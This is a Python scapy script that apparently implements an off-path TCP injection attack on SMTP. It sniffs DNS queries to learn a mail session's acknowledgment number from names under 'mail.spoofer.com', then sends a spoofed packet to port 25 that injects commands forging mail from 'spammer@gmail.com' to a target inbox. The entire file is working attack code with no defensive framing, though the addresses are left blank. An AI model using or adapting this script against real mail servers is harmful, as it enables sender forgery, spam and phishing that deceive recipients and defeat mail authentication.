from datetime import datetime
import asyncore
import sys
from smtpd import SMTPServer
from scapy.all import *
import time




def parse_dns_query(packet):
    try:
        temp = str(packet[DNS].qd.qname)[2:-1]
        if 'mail.spoofer.com' in str(packet[DNS].qd.qname):
            ack_number = int(temp.split('.')[0])
            t = time.localtime()
            current_time = time.strftime("%H:%M:%S", t)
            print(current_time)
            print(ack_number)
            # get correct ack_number from dns feedback channel

            ip = IP(src='',dst='')
            
            sent_payload = "EHLO %d.mail.spoofer.com\r\nMAIL FROM:<a@%d.mail.spoofer.com>\r\nRCPT TO:<incoming@mail.target.com>\r\n" % (ack_number,ack_number)


            tcp = TCP(sport=60020,dport=25,seq=1+len(sent_payload),ack=ack_number,flags='PA')

            payload =  b"NOOP\r\nNOOP\r\nNOOP\r\nEHLO gmail.com\r\nMAIL FROM:<spammer@gmail.com>\r\nRCPT TO:<incoming@mail.target.com>\r\nDATA\r\nFrom:spammer@gmail.com\r\nTo:incoming@mail.target.com\r\nSubject:This is a spammer message\r\n\r\nThis is a spammer message\r\n.\r\n"
            send(ip/tcp/payload)
    except:
        pass


def dns_query_sniffer():
    packet_filter = " and ".join([
        "udp dst port 53"
        ])

    iface = '' # interface to sniff DNS packets
    sniffer = sniff(filter=packet_filter,prn=parse_dns_query,iface=iface)

if __name__ == '__main__':
    conf.L3socket = L3RawSocket
    dns_query_sniffer()



